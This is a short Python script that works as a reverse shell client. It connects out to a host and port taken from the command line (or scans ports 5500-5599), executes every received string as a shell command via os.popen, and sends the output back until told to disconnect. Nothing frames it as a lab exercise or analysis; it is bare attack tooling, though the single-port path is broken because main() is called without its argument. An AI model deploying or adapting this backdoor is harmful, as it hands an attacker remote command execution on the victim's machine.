import socket, os, sys

def main(client):
    while True:
        try:            
            it = client.recv(4096)
            it = it.decode('utf-8')
            commandum = it
            if 'DISCONNECT' in it:
                break
            try:
                result = os.popen(commandum).read()
                result = result.encode()
            except:
                result = "FATAL EWWOW"
            client.send(result)
        except:
            break

def GetOptions():
    try:
        host = sys.argv[1]
    except:
        sys.exit()
    try:
        int(sys.argv[2])
        port = sys.argv[2]
        PingPort(host, port)   
    except:
        if '-r' in sys.argv[2]:
            PingPortRange(host) 
        if sys.argv[2] == '-p':
            port = sys.argv[3]
            PingPort(host, port)
        else:
            sys.exit()
            
def PingPortRange(host):
    for p in range(5500,5600):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(0.0000001)
            client.connect ((host, (p)))
            client.settimeout(None)
            main(client)
            break
        except BaseException:
            pass
    sys.exit()

            

def PingPort(host, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(0.1)
        client.connect ((host, int(port)))
        client.settimeout(None)
        main()
    except BaseException:
        sys.exit()

GetOptions()

#version 1.3
